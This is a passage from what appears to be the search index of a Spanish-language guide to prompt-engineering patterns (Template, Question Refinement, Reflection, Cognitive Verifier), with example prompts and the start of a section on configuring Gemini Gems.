explicar\u00e1n c\u00f3mo debe insertarse la salida a trav\u00e9s de estos marcadores, los cuales permiten se\u00f1alar sem\u00e1nticamente d\u00f3nde va la informaci\u00f3n. Los marcadores pueden usar formatos como <code>NOMBRE</code>, permitiendo al LLM inferir el significado para determinar qu\u00e9 insertar (por ejemplo, el nombre de una persona en el marcador <code>NOMBRE</code>). Adem\u00e1s, el uso de marcadores permite indicar qu\u00e9 informaci\u00f3n es innecesaria: si no hay un marcador para un componente, este puede omitirse. Idealmente, los marcadores deben usar un formato com\u00fan en los datos de entrenamiento del LLM, como may\u00fasculas sostenidas o corchetes.</p> <p>La tercera declaraci\u00f3n intenta restringir al LLM para que no reescriba o modifique arbitrariamente la plantilla para acomodar todos los componentes. Cabe se\u00f1alar que esto podr\u00eda no impedir la generaci\u00f3n de texto adicional antes o despu\u00e9s de la plantilla. En la pr\u00e1ctica, los LLMs suelen respetar la estructura, pero eliminar el texto excedente puede requerir experimentar con la redacci\u00f3n del prompt.</p>"},{"location":"Patron-de-Plantilla/#4-implementacion-de-ejemplo","title":"4. Implementaci\u00f3n de Ejemplo","text":"<p>A continuaci\u00f3n se muestra una plantilla de ejemplo para generar URLs donde la salida se coloca en lugares espec\u00edficos de la plantilla:</p> <p>\u201cVoy a proporcionar una plantilla para tu salida. Todo lo que est\u00e9 en may\u00fasculas sostenidas es un marcador de posici\u00f3n. Cada vez que generes texto, intenta ajustarlo en uno de los marcadores de posici\u00f3n que enumero. Por favor, conserva el formato y la plantilla general que proporciono en <code>https://myapi.com/NOMBRE/perfil/TRABAJO</code>\u201d.</p> <p>A continuaci\u00f3n se muestra una interacci\u00f3n de ejemplo despu\u00e9s de proporcionar el prompt:</p> <p>Usuario: \u201cGenera un nombre y un cargo para una persona\u201d. ChatGPT: <code>https://myapi.com/Emily_Parker/perfil/Software_Engineer</code></p>"},{"location":"Patron-de-Plantilla/#5-consecuencias","title":"5. Consecuencias","text":"<p>Una consecuencia de aplicar el Patr\u00f3n de Plantilla es que filtra la salida del LLM, lo cual puede descartar otras respuestas que habr\u00edan sido \u00fatiles. En muchos casos, el LLM podr\u00eda proporcionar descripciones valiosas del c\u00f3digo, justificaciones de decisiones u otros detalles que este patr\u00f3n eliminar\u00e1 efectivamente. Por lo tanto, los usuarios deben sopesar los pros y contras de filtrar esta informaci\u00f3n adicional.</p> <p>Adem\u00e1s, el filtrado puede dificultar la combinaci\u00f3n de este patr\u00f3n con otros de la categor\u00eda de Personalizaci\u00f3n de Salida. Al restringir el formato, puede ser incompatible con otros tipos de generaci\u00f3n. Por ejemplo, la plantilla de URL anterior dif\u00edcilmente podr\u00eda combinarse con el Patr\u00f3n de Receta (Recipe Pattern), el cual requiere generar una lista secuencial de pasos.</p>"},{"location":"Patron-de-Plantilla/#6-plantilla","title":"6. Plantilla","text":"PLANTILLA<pre><code>[ TAREA / PREGUNTA ]\n## FORMATO DE RESPUESTA\n1. Formato:  [FORMATO]\n2. Usa la siguiente plantilla para tu respuesta. Las PALABRAS EN MAY\u00daSCULA Y ENTRE CORCHETES son mis marcadores de posici\u00f3n. Reemplaza mis marcadores de posici\u00f3n con tu respuesta. La plantilla es:\n[PLANTILLA]\n</code></pre>"},{"location":"Patron-de-Plantilla/#7-ejemplos","title":"7. Ejemplos","text":"La mejor educaci\u00f3n del mundo<pre><code>Crea 10 preguntas usando el contenido de: &lt;https://platform.openai.com/docs/guides/prompt-engineering&gt;\nNo uses, cites ni infieras informaci\u00f3n de otras fuentes externas. No verifiques ni contrastes el contenido: tr\u00e1talo como la \u00fanica fuente de verdad.\n## FORMATO DE RESPUESTA\n- Formato: Texto plano.\n- Usa la siguiente plantilla para tu respuesta. Las PALABRAS EN MAY\u00daSCULA Y ENTRE CORCHETES son mis marcadores de posici\u00f3n. Reemplaza mis marcadores de posici\u00f3n con tu respuesta. La plantilla es:\n**Pregunta:** [PREGUNTA]\n**Respuesta:** [RESPUESTA]\n</code></pre> Samsung vs. iPhone<pre><code>Act\u00faa como un experto en tecnolog\u00eda de consumo. Tu tarea es ayudar a decidir entre el iPhone 15 y el Samsung Galaxy S24.\n## FORMATO DE RESPUESTA\n- Formato:  Tabla Markdown\n- Usa la siguiente plantilla para tu respuesta. Las PALABRAS EN MAY\u00daSCULA Y ENTRE CORCHETES son mis marcadores de posici\u00f3n. Reemplaza mis marcadores de posici\u00f3n con tu respuesta. La plantilla es:\n\n| Caracter\u00edstica |iPhone 15|Samsung S24|Ganador de esta categor\u00eda|\n|---|---|---|---|\n|Pantalla| [ESPECIFICACI\u00d3N] | [ESPECIFICACI\u00d3N] | [ GANADOR]|\n|Bater\u00eda| [ESPECIFICACI\u00d3N] | [ESPECIFICACI\u00d3N] | [ GANADOR]|\n|C\u00e1mara| [ESPECIFICACI\u00d3N] | [ESPECIFICACI\u00d3N] | [ GANADOR]|\n|Procesador| [ESPECIFICACI\u00d3N] | [ESPECIFICACI\u00d3N] | [ GANADOR]|\n</code></pre>"},{"location":"Patron-de-Refinamiento-de-Pregunta/","title":"El Patr\u00f3n de Refinamiento de Pregunta","text":""},{"location":"Patron-de-Refinamiento-de-Pregunta/#1-proposito-y-contexto","title":"1. Prop\u00f3sito y Contexto","text":"<p>Este patr\u00f3n involucra al LLM en el proceso de ingenier\u00eda de prompts. La intenci\u00f3n es asegurar que el modelo conversacional sugiera siempre versiones potencialmente mejores o m\u00e1s refinadas de la pregunta original del usuario. Al usar este patr\u00f3n, el LLM ayuda a encontrar la pregunta correcta para obtener una respuesta precisa. Adem\u00e1s, puede facilitar el acceso a la informaci\u00f3n o el logro del objetivo con menos interacciones que si se empleara un prompting de prueba y error.</p>"},{"location":"Patron-de-Refinamiento-de-Pregunta/#2-motivacion","title":"2. Motivaci\u00f3n","text":"<p>Cuando un usuario hace una pregunta, es posible que no sea un experto en el dominio, que desconozca la mejor manera de formularla o que ignore informaci\u00f3n adicional \u00fatil para el planteamiento. Los LLMs a menudo declaran limitaciones sobre su respuesta o solicitan datos extra para mayor precisi\u00f3n, adem\u00e1s de indicar las suposiciones realizadas. La motivaci\u00f3n reside en usar esa informaci\u00f3n o suposiciones para generar un mejor prompt. En lugar de exigir al usuario que procese y reformule su solicitud manualmente, el LLM puede refinar el prompt directamente para incorporar dichos elementos .</p>"},{"location":"Patron-de-Refinamiento-de-Pregunta/#3-estructura-e-ideas-clave","title":"3. Estructura e Ideas Clave","text":"<p>Declaraciones contextuales fundamentales:</p> Declaraciones Contextuales Dentro del alcance X, sugiere una versi\u00f3n mejor de la pregunta para usar en su lugar (Opcional) preg\u00fantame si me gustar\u00eda usar la versi\u00f3n mejorada en su lugar <p>La primera declaraci\u00f3n pide al LLM que sugiera una versi\u00f3n mejorada de la pregunta dentro de un \u00e1mbito espec\u00edfico. Se define un \u00e1mbito (scope) para evitar que todas las preguntas se reformulen autom\u00e1ticamente o para asegurar que se refinen hacia un objetivo concreto . La segunda declaraci\u00f3n est\u00e1 destinada a la automatizaci\u00f3n, permitiendo al usuario aceptar la pregunta refinada sin tener que copiarla o escribirla de nuevo. La ingenier\u00eda de este prompt puede mejorarse combin\u00e1ndola con el Patr\u00f3n de Reflexi\u00f3n (Reflection Pattern), permitiendo que el LLM explique por qu\u00e9 considera que la nueva versi\u00f3n es una mejora.</p>"},{"location":"Patron-de-Refinamiento-de-Pregunta/#4-implementacion-de-ejemplo","title":"4. Implementaci\u00f3n de Ejemplo","text":"<p>\"A partir de ahora, siempre que haga una pregunta sobre la seguridad de un artefacto de software, sugiere una mejor versi\u00f3n de la pregunta que incorpore informaci\u00f3n espec\u00edfica sobre riesgos de seguridad en el lenguaje o framework que estoy usando, y preg\u00fantame si me gustar\u00eda usar tu versi\u00f3n en su lugar\".</p> <p>En este contexto, el LLM utilizar\u00e1 el patr\u00f3n para mejorar las consultas de seguridad, solicitando o integrando detalles sobre el artefacto de software y la tecnolog\u00eda utilizada. Por ejemplo, si un desarrollador de una aplicaci\u00f3n web en Python con FastAPI pregunta a ChatGPT \"\u00bfC\u00f3mo manejo la autenticaci\u00f3n de usuarios?\", el modelo refinar\u00e1 la pregunta considerando el contexto tecnol\u00f3gico. Proporcionar\u00e1 entonces una revisi\u00f3n m\u00e1s espec\u00edfica, tal como: \"\u00bfCu\u00e1les son las mejores pr\u00e1cticas para manejar la autenticaci\u00f3n de usuarios de forma segura en una aplicaci\u00f3n web FastAPI para mitigar riesgos comunes, como cross-site scripting (XSS), falsificaci\u00f3n de solicitudes entre sitios (CSRF) y secuestro de sesiones?\".</p> <p>Es probable que el detalle adicional no solo conciencie al usuario sobre problemas a considerar, sino que conduzca a una mejor respuesta t\u00e9cnica. Para tareas de ingenier\u00eda de software, este patr\u00f3n podr\u00eda incorporar consideraciones sobre bugs, modularidad o calidad del c\u00f3digo . Otro enfoque ser\u00eda refinar las preguntas para que el c\u00f3digo generado respete la separaci\u00f3n de responsabilidades (separation of concerns) o minimice el uso de bibliotecas externas, tal como:</p> <p>\"Siempre que haga una pregunta sobre c\u00f3mo escribir c\u00f3digo, sugiere una mejor versi\u00f3n que pida c\u00f3mo hacerlo minimizando mis dependencias de bibliotecas externas.\"</p>"},{"location":"Patron-de-Refinamiento-de-Pregunta/#5-consecuencias","title":"5. Consecuencias","text":"<p>El patr\u00f3n de Refinamiento de Pregunta cierra la brecha entre el conocimiento del usuario y la comprensi\u00f3n del LLM, produciendo interacciones m\u00e1s eficientes. Un riesgo es su tendencia a acotar r\u00e1pidamente el cuestionamiento hacia un \u00e1rea espec\u00edfica, guiando al usuario por un camino de indagaci\u00f3n m\u00e1s limitado de lo necesario. Como resultado de esta limitaci\u00f3n, el usuario podr\u00eda perder de vista el \"panorama general\" (bigger picture). Una soluci\u00f3n es ampliar el alcance en el prompt, por ejemplo: \"no limites mis preguntas a lenguajes o frameworks espec\u00edficos\".</p> <p>Para superar una orientaci\u00f3n demasiado estrecha, se puede combinar este patr\u00f3n con otros, como el Patr\u00f3n de Verificador Cognitivo (Cognitive Verifier). Esto instruye al LLM a producir una serie de preguntas de seguimiento (\"subpreguntas\") que ayuden a construir la pregunta refinada. Por ejemplo:</p> <p>\u201cDe ahora en adelante, cada vez que haga una pregunta, haz cuatro preguntas adicionales que te ayuden a producir una versi\u00f3n mejor de mi pregunta original. Luego, usa mis respuestas para sugerir una versi\u00f3n mejor de mi pregunta original\u201d.</p> <p>Al igual que con muchos patrones que permiten a un LLM generar nuevas preguntas utilizando su conocimiento, el LLM puede introducir t\u00e9rminos o conceptos desconocidos para el usuario en la pregunta. Una forma de abordar este problema es incluir una declaraci\u00f3n que indique que el LLM debe explicar cualquier t\u00e9rmino desconocido que introduzca en la pregunta. Una mejora adicional de esta idea es combinar el patr\u00f3n de Refinamiento de Pregunta con el patr\u00f3n Persona para que el LLM marque los t\u00e9rminos y genere definiciones que asuman un nivel particular de conocimiento, como en este ejemplo:</p> <p>\u201cDe ahora en adelante, cada vez que haga una pregunta, haz cuatro preguntas adicionales que te ayuden a producir una versi\u00f3n mejor de mi pregunta original. Luego, usa mis respuestas para sugerir una versi\u00f3n mejor de mi pregunta original. Despu\u00e9s de las preguntas de seguimiento, act\u00faa temporalmente como un usuario sin conocimientos de AWS y define cualquier t\u00e9rmino que necesite saber para responder con precisi\u00f3n a las preguntas\u201d.</p> <p>Un LLM siempre puede producir imprecisiones f\u00e1cticas, al igual que un humano. Un riesgo de este patr\u00f3n es que las imprecisiones se introduzcan en la pregunta refinada. Este riesgo puede mitigarse, sin embargo, combinando el patr\u00f3n de Lista de Verificaci\u00f3n de Hechos para permitir al usuario identificar posibles imprecisiones y el patr\u00f3n de Reflexi\u00f3n para explicar el razonamiento detr\u00e1s del refinamiento de la pregunta.</p>"},{"location":"Patron-de-Refinamiento-de-Pregunta/#6-plantilla","title":"6. Plantilla","text":"PLANTILLA<pre><code>[PREGUNTA]\n## PROTOCOLO DE REFINAMIENTO\nNo generes la respuesta todav\u00eda, ni des ejemplos o borradores. En su lugar:\n1. Sugiere una mejor versi\u00f3n de mi pregunta.\n2. Explica brevemente POR QU\u00c9 tu versi\u00f3n es mejor.\n3. Cons\u00faltame si quiero usar la versi\u00f3n que tu proporcionas.\n</code></pre>"},{"location":"Patron-de-Refinamiento-de-Pregunta/#7-ejemplos","title":"7. Ejemplos","text":"N\u00famero de Huesos<pre><code>\u00bfCu\u00e1ntos huesos tiene el cuerpo humano?\n## PROTOCOLO DE REFINAMIENTO\nNo generes la respuesta todav\u00eda, ni des ejemplos o borradores. En su lugar:\n1. Sugiere una mejor versi\u00f3n de mi pregunta.\n2. Explica brevemente POR QU\u00c9 tu versi\u00f3n es mejor.\n3. Cons\u00faltame si quiero usar la versi\u00f3n que tu proporcionas.\n</code></pre> N\u00famero de Paises<pre><code>\u00bfCu\u00e1ntos pa\u00edses hay en el mundo?\n## PROTOCOLO DE REFINAMIENTO\nNo generes la respuesta todav\u00eda, ni des ejemplos o borradores. En su lugar:\n1. Sugiere una mejor versi\u00f3n de mi pregunta.\n2. Explica brevemente POR QU\u00c9 tu versi\u00f3n es mejor.\n3. Cons\u00faltame si quiero usar la versi\u00f3n que tu proporcionas.\n</code></pre> La monta\u00f1a m\u00e1s alta<pre><code>\u00bfCu\u00e1l es la monta\u00f1a m\u00e1s alta?\n## PROTOCOLO DE REFINAMIENTO\nNo generes la respuesta todav\u00eda, ni des ejemplos o borradores. En su lugar:\n1. Sugiere una mejor versi\u00f3n de mi pregunta.\n2. Explica brevemente POR QU\u00c9 tu versi\u00f3n es mejor.\n3. Cons\u00faltame si quiero usar la versi\u00f3n que tu proporcionas.\n</code></pre> A qu\u00e9 temperatura<pre><code>\u00bfA qu\u00e9 temperatura hierve el agua?\n## PROTOCOLO DE REFINAMIENTO\nNo generes la respuesta todav\u00eda, ni des ejemplos o borradores. En su lugar:\n1. Sugiere una mejor versi\u00f3n de mi pregunta.\n2. Explica brevemente POR QU\u00c9 tu versi\u00f3n es mejor.\n3. Cons\u00faltame si quiero usar la versi\u00f3n que tu proporcionas.\n</code></pre> Fruta o verdura<pre><code>\u00bfEl tomate es una fruta o una verdura?\n## PROTOCOLO DE REFINAMIENTO\nNo generes la respuesta todav\u00eda, ni des ejemplos o borradores. En su lugar:\n1. Sugiere una mejor versi\u00f3n de mi pregunta.\n2. Explica brevemente POR QU\u00c9 tu versi\u00f3n es mejor.\n3. Cons\u00faltame si quiero usar la versi\u00f3n que tu proporcionas.\n</code></pre>"},{"location":"Patron-de-Reflexion/","title":"El Patr\u00f3n de Reflexi\u00f3n","text":""},{"location":"Patron-de-Reflexion/#1-proposito-y-contexto","title":"1. Prop\u00f3sito y Contexto","text":"<p>El objetivo de este patr\u00f3n es solicitar al modelo que explique autom\u00e1ticamente el razonamiento que sustenta las respuestas dadas al usuario. Este patr\u00f3n permite a los usuarios evaluar mejor la validez de la salida y comprender c\u00f3mo el LLM arrib\u00f3 a una respuesta particular. La reflexi\u00f3n puede aclarar puntos de confusi\u00f3n, revelar suposiciones subyacentes y evidenciar lagunas en el conocimiento o la comprensi\u00f3n.</p>"},{"location":"Patron-de-Reflexion/#2-motivacion","title":"2. Motivaci\u00f3n","text":"<p>Los LLMs pueden cometer errores, y de hecho lo hacen. Adem\u00e1s, los usuarios a menudo no entienden por qu\u00e9 el modelo produce una salida espec\u00edfica ni c\u00f3mo adaptar su prompt para corregirla. Al pedir al LLM que explique su razonamiento, los usuarios obtienen una mejor comprensi\u00f3n de c\u00f3mo el modelo procesa la entrada, qu\u00e9 suposiciones establece y en qu\u00e9 datos se basa .</p> <p>Los LLMs pueden proporcionar respuestas incompletas, incorrectas o ambiguas. La reflexi\u00f3n act\u00faa como una ayuda para abordar estas deficiencias y asegurar que la informaci\u00f3n sea lo m\u00e1s precisa posible. Un beneficio adicional es que ayuda a los usuarios a depurar (debug) sus prompts para determinar por qu\u00e9 no obtienen los resultados esperados. Este patr\u00f3n es particularmente eficaz para explorar temas propensos a confusi\u00f3n o con interpretaciones matizadas, donde es crucial conocer la interpretaci\u00f3n exacta que utiliz\u00f3 el LLM.</p>"},{"location":"Patron-de-Reflexion/#3-estructura-e-ideas-clave","title":"3. Estructura e Ideas Clave","text":"<p>Declaraciones contextuales fundamentales:</p> Declaraciones Contextuales Siempre que generes una respuesta. Explica el razonamiento y las suposiciones en las que se basa tu respuesta. (Opcional) ...para que pueda mejorar mi pregunta. <p>La primera declaraci\u00f3n solicita que, tras generar una respuesta, el LLM explique su razonamiento y suposiciones. Esto ayuda al usuario a entender el proceso deductivo del modelo y fomenta la confianza en sus respuestas. La declaraci\u00f3n opcional indica que el prop\u00f3sito de la explicaci\u00f3n es refinar la consulta del usuario. Esto proporciona al LLM el contexto necesario para adaptar sus explicaciones con el fin espec\u00edfico de ayudar al usuario a formular mejores preguntas de seguimiento.</p>"},{"location":"Patron-de-Reflexion/#4-implementacion-de-ejemplo","title":"4. Implementaci\u00f3n de Ejemplo","text":"<p>Este ejemplo adapta el prompt al dominio del desarrollo de software:</p> <p>\"Cuando proporciones una respuesta, por favor explica el razonamiento y las suposiciones detr\u00e1s de tu selecci\u00f3n de frameworks de software. Si es posible, utiliza ejemplos espec\u00edficos o evidencia con fragmentos de c\u00f3digo asociados para respaldar por qu\u00e9 ese framework es la mejor elecci\u00f3n para la tarea. Adem\u00e1s, por favor aborda cualquier posible ambig\u00fcedad o limitaci\u00f3n en tu respuesta, para proporcionar una contestaci\u00f3n m\u00e1s completa y precisa.\"</p> <p>El patr\u00f3n se personaliza para instruir al LLM a justificar su selecci\u00f3n de frameworks, aunque no necesariamente otros aspectos. Adem\u00e1s, se dicta el uso de fragmentos de c\u00f3digo para ilustrar la motivaci\u00f3n detr\u00e1s de la elecci\u00f3n tecnol\u00f3gica.</p>"},{"location":"Patron-de-Reflexion/#5-consecuencias","title":"5. Consecuencias","text":"<p>Una consecuencia del Patr\u00f3n de Reflexi\u00f3n es que puede resultar ineficaz para usuarios que desconocen el tema en discusi\u00f3n. Por ejemplo, una pregunta t\u00e9cnica realizada por un usuario no t\u00e9cnico podr\u00eda derivar en una justificaci\u00f3n compleja que el usuario no logre comprender.</p> <p>Como ocurre con otros patrones, existe el riesgo de que la explicaci\u00f3n del razonamiento contenga errores o suposiciones inexactas dif\u00edciles de detectar para el usuario. Este patr\u00f3n puede combinarse con la Lista de Verificaci\u00f3n de Hechos (Fact Check List Pattern) para mitigar este problema.</p>"},{"location":"Patron-de-Reflexion/#6-plantilla","title":"6. Plantilla","text":"PLANTILLA<pre><code>[TAREA / PREGUNTA]\n## INSTRUCCIONES DE REFLEXI\u00d3N\n**Una vez generada la respuesta**, a\u00f1ade un separador y una secci\u00f3n titulada \"\ud83d\udd0d REFLEXI\u00d3N INTERNA\". En ella debes detallar:\n1. El razonamiento paso a paso que seguiste.\n2. Las suposiciones que hiciste sobre mi contexto o intenciones.\n3. Cualquier limitaci\u00f3n o posible ambig\u00fcedad en tu respuesta.\n4. Soluciones consideradas pero descartadas.\n</code></pre>"},{"location":"Patron-de-Reflexion/#7-ejemplos","title":"7. Ejemplos","text":"Cubo de Rubik<pre><code>\u00bfCu\u00e1ntos movimientos m\u00ednimos se necesitan para resolver un cubo de Rubik 3\u00d73?\n## INSTRUCCIONES DE REFLEXI\u00d3N\n**Una vez generada la respuesta**, a\u00f1ade un separador y una secci\u00f3n titulada \"\ud83d\udd0d  Reflexi\u00f3n y Justificaci\u00f3n\". En ella debes detallar:\n1. El razonamiento que seguiste.\n2. Las suposiciones que hiciste sobre mi contexto o intenciones.\n3. Cualquier limitaci\u00f3n o posible ambig\u00fcedad en tu respuesta.\n4. Soluciones consideradas pero descartadas.\n</code></pre> La Trampa Cultural<pre><code>\u00bfCu\u00e1nto debo dejar de propina en un restaurante por un buen servicio?\n## INSTRUCCIONES DE REFLEXI\u00d3N\n**Una vez generada la respuesta**, a\u00f1ade un separador y una secci\u00f3n titulada \"\ud83d\udd0d  Reflexi\u00f3n y Justificaci\u00f3n\". En ella debes detallar:\n1. El razonamiento que seguiste.\n2. Las suposiciones que hiciste sobre mi contexto o intenciones.\n3. Cualquier limitaci\u00f3n o posible ambig\u00fcedad en tu respuesta.\n4. Soluciones consideradas pero descartadas.\n</code></pre> La Trampa \u00c9tica/Seguridad<pre><code>He perdido mis llaves. \u00bfC\u00f3mo puedo abrir la puerta de mi casa sin romperla?\n## INSTRUCCIONES DE REFLEXI\u00d3N\n**Una vez generada la respuesta**, a\u00f1ade un separador y una secci\u00f3n titulada \"\ud83d\udd0d  Reflexi\u00f3n y Justificaci\u00f3n\". En ella debes detallar:\n1.  El razonamiento que seguiste.\n2.  Las suposiciones que hiciste sobre mi contexto o intenciones.\n3. Cualquier limitaci\u00f3n o posible ambig\u00fcedad en tu respuesta.\n4. Soluciones consideradas pero descartadas.\n</code></pre>"},{"location":"Patron-de-Verificador-Cognitivo/","title":"El Patr\u00f3n de Verificador Cognitivo","text":""},{"location":"Patron-de-Verificador-Cognitivo/#1-proposito-y-contexto","title":"1. Prop\u00f3sito y Contexto","text":"<p>La literatura de investigaci\u00f3n ha documentado que los LLMs suelen razonar mejor si una pregunta compleja se subdivide en interrogantes adicionales, cuyas respuestas se combinan para formar la respuesta general a la pregunta original. La intenci\u00f3n del patr\u00f3n es forzar al LLM a desglosar siempre las consultas en preguntas subsidiarias que permitan construir una mejor respuesta final.</p>"},{"location":"Patron-de-Verificador-Cognitivo/#2-motivacion","title":"2. Motivaci\u00f3n","text":"<p>La motivaci\u00f3n del patr\u00f3n de Verificador Cognitivo es doble:</p> <ol> <li> <p>Los humanos pueden formular inicialmente preguntas de demasiado alto nivel para obtener una respuesta concreta sin seguimiento adicional. Esto puede deberse a la falta de familiaridad con el dominio, falta de esfuerzo en la redacci\u00f3n del prompt o inseguridad sobre el fraseo correcto.</p> </li> <li> <p>La investigaci\u00f3n demuestra que los LLMs a menudo se desempe\u00f1an mejor cuando abordan una consulta subdividida en preguntas individuales.</p> </li> </ol>"},{"location":"Patron-de-Verificador-Cognitivo/#3-estructura-e-ideas-clave","title":"3. Estructura e Ideas Clave","text":"<p>Declaraciones contextuales fundamentales:</p> Declaraciones Contextuales Cuando se te haga una pregunta, sigue estas reglas Genera una serie de preguntas adicionales que ayudar\u00edan a responder con mayor precisi\u00f3n a la pregunta. Combina las respuestas de las preguntas individuales para producir la respuesta final a la pregunta general. <p>La primera declaraci\u00f3n instruye generar una serie de preguntas adicionales que ayuden a responder con mayor precisi\u00f3n a la original. Este paso obliga al LLM a considerar el contexto e identificar informaci\u00f3n faltante o ambigua. Al generar estas preguntas, el LLM asegura que la respuesta final sea lo m\u00e1s completa y precisa posible. Esto tambi\u00e9n fomenta el pensamiento cr\u00edtico del usuario, descubriendo nuevas perspectivas que tal vez no se consideraron inicialmente, lo que conduce a mejores preguntas de seguimiento.</p> <p>La segunda declaraci\u00f3n ordena integrar las respuestas individuales para producir la respuesta final. Este paso asegura que toda la informaci\u00f3n recopilada se incorpore en la conclusi\u00f3n. Al combinar las respuestas, el LLM proporciona una soluci\u00f3n m\u00e1s robusta y evita basarse en un \u00fanico punto de datos.</p>"},{"location":"Patron-de-Verificador-Cognitivo/#4-implementacion-de-ejemplo","title":"4. Implementaci\u00f3n de Ejemplo","text":"<p>\"Cuando te haga una pregunta, genera tres preguntas adicionales que te ayudar\u00edan a dar una respuesta m\u00e1s precisa. Cuando haya respondido a las tres preguntas, combina las respuestas para producir la respuesta final a mi pregunta original.\"</p> <p>Esta instancia a\u00f1ade un refinamiento al especificar un n\u00famero fijo de preguntas adicionales. En este caso, el prompt estipula que ChatGPT debe generar tres preguntas auxiliares. Este n\u00famero puede ajustarse seg\u00fan la experiencia del usuario y su disposici\u00f3n a colaborar.</p> <p>Un refinamiento adicional puede proporcionar contexto sobre el nivel de conocimiento del usuario:</p> <p>\"Cuando te haga una pregunta, genera tres preguntas adicionales que te ayudar\u00edan a dar una respuesta m\u00e1s precisa. Asume que s\u00e9 poco sobre el tema y, por favor, define cualquier t\u00e9rmino que no sea de conocimiento general. Cuando haya respondido a las tres preguntas, combina las respuestas para producir la respuesta final\".</p> <p>Este refinamiento especifica que el usuario carece de una comprensi\u00f3n s\u00f3lida del tema, instruyendo al LLM a definir t\u00e9rminos t\u00e9cnicos. Esto asegura que las preguntas de seguimiento sean accesibles y f\u00e1ciles de entender para usuarios con distintos niveles de experiencia.</p>"},{"location":"Patron-de-Verificador-Cognitivo/#5-consecuencias","title":"5. Consecuencias","text":"<p>Este patr\u00f3n puede estipular el n\u00famero exacto de preguntas o dejar la decisi\u00f3n al LLM. Existen ventajas y desventajas en fijar un n\u00famero exacto. Una ventaja es que acota estrictamente la cantidad de informaci\u00f3n adicional que el usuario debe aportar, manteni\u00e9ndola dentro de un rango manejable.</p> <p>Sin embargo, una desventaja es que, dadas N preguntas, podr\u00eda existir una pregunta N+1 valiosa que siempre quedar\u00e1 fuera del alcance. Alternativamente, se puede dar un rango o libertad total al LLM. No obstante, sin un l\u00edmite, el LLM podr\u00eda generar una cantidad excesiva de preguntas que abrume al usuario.</p>"},{"location":"Patron-de-Verificador-Cognitivo/#6-plantilla","title":"6. Plantilla","text":"PLANTILLA<pre><code>[ TAREA / PREGUNTA ]\n## ESTRATEGIA DE VERIFICACI\u00d3N COGNITIVA \nNo generes la respuesta todav\u00eda, ni des ejemplos o borradores. En su lugar:\n1. Para que puedas responder con precisi\u00f3n, genera [N - Opcional] preguntas adicionales que necesites que yo responda para aclarar el contexto. \n2. Una vez que yo responda, combina esa nueva informaci\u00f3n para producir la respuesta final y completa.\n</code></pre>"},{"location":"Patron-de-Verificador-Cognitivo/#7-ejemplos","title":"7. Ejemplos","text":"La Excusa Perfecta<pre><code>Genera una excusa cre\u00edble para no ir a la fiesta de cumplea\u00f1os de mi jefe este s\u00e1bado.\n## ESTRATEGIA DE VERIFICACI\u00d3N COGNITIVA \nNo generes la respuesta todav\u00eda, ni des ejemplos o borradores. En su lugar:\n1. Para que puedas responder con precisi\u00f3n, genera 4 preguntas adicionales que necesites que yo responda para aclarar el contexto. \n2. Una vez que yo responda, combina esa nueva informaci\u00f3n para producir la respuesta final y completa.\n</code></pre> El P\u00e1nico del Aniversario<pre><code>Olvid\u00e9 que ma\u00f1ana mi esposa y yo estamos de aniversario. Dime qu\u00e9 comprar r\u00e1pido.\n## ESTRATEGIA DE VERIFICACI\u00d3N COGNITIVA \nNo generes la respuesta todav\u00eda, ni des ejemplos o borradores. En su lugar:\n1. Para que puedas responder con precisi\u00f3n, genera 4 preguntas adicionales que necesites que yo responda para aclarar el contexto. \n2. Una vez que yo responda, combina esa nueva informaci\u00f3n para producir la respuesta final y completa.\n</code></pre> Diplomacia Pasivo-Agresiva<pre><code>Escribe un correo para mi compa\u00f1ero de trabajo que se sigue robando mis yogures del refrigerador com\u00fan.\n## ESTRATEGIA DE VERIFICACI\u00d3N COGNITIVA \nNo generes la respuesta todav\u00eda, ni des ejemplos o borradores. En su lugar:\n1. Para que puedas responder con precisi\u00f3n, genera 4 preguntas adicionales que necesites que yo responda para aclarar el contexto. \n2. Una vez que yo responda, combina esa nueva informaci\u00f3n para producir la respuesta final y completa.\n</code></pre>"},{"location":"gems/","title":"Gems","text":""},{"location":"gems/#crear-una-gem","title":"Crear una Gem","text":"<p>Brinda detalles sobre tus objetivos, comportamientos deseados y formato preferido para ayudar a la Gem a personalizar las respuestas de Gemini.</p> <p>Las principales \u00e1reas a considerar para escribir instrucciones Gem \u00fatiles son las mismas que para escribir instrucciones generales. No es necesario que uses las cuatro, pero te servir\u00e1 implementar algunas:</p>"},{"location":"gems/#nombre","title":"Nombre","text":""},{"location":"gems/#descripcion","title":"Descripci\u00f3n","text":""},{"location":"gems/#instrucciones","title":"Instrucciones","text":""},{"location":"gems/#personalidad","title":"Personalidad","text":"<p>Ind\u00edcale a tu Gem qu\u00e9 posici\u00f3n asumir y c\u00f3mo responder.</p>"},{"location":"gems/#tarea","title":"Tarea","text":"<p>Dile a la Gem qu\u00e9 quieres que Gemini haga o cree.</p>"},{"location":"gems/#contexto","title":"Contexto","text":"<p>Brinda tanto contexto como puedas.</p>"},{"location":"gems/#formato","title":"Formato","text":"<p>Especifica de manera clara la estructura deseada.</p>"},{"location":"gems/#reescritura-magica","title":"Reescritura m\u00e1gica","text":"<p>Puedes escribir una frase simple y pulsar el icono de \"Usar Gemini para reescribir instrucciones\" (la varita m\u00e1gica).</p>"},{"location":"gems/#herramienta-predeterminada","title":"Herramienta predeterminada","text":"<p>Si empiezas una nueva conversaci\u00f3n con el Gem, se seleccionar\u00e1 la herramienta predeterminada. No obstante, puedes quitarla o seleccionar otra.</p>"},{"location":"gems/#conocimientos","title":"Conocimientos","text":"<p>Puedes a\u00f1adir archivos para darle m\u00e1s contexto a tu Gem o para hacer referencia a documentos espec\u00edficos en tus conversaciones con \u00e9l. </p> <ul> <li>Para subir un archivo de tu dispositivo: haz clic en Subir archivos</li> <li>Para a\u00f1adir un archivo de tu Google Drive: haz clic en Drive .</li> <li>Para a\u00f1adir archivos de tu Drive, debes tener activado el ajuste Actividad en las aplicaciones de Gemini y conectar Google Workspace con las aplicaciones de Gemini. Si no lo has conectado, ver\u00e1s la opci\u00f3n para hacerlo. Consulta informaci\u00f3n sobre tus datos de las aplicaciones de Gemini y Google Workspace.</li> <li>Si a\u00f1ades un archivo de tu Drive, Gemini utilizar\u00e1 la versi\u00f3n m\u00e1s reciente del archivo. Si modificas el archivo, esos cambios se reflejar\u00e1n en tu Gem.</li> </ul> <p>Si compartes este Gem, se mostrar\u00e1n los t\u00edtulos de los archivos adjuntos. Se te pedir\u00e1 por separado que compartas el contenido del archivo 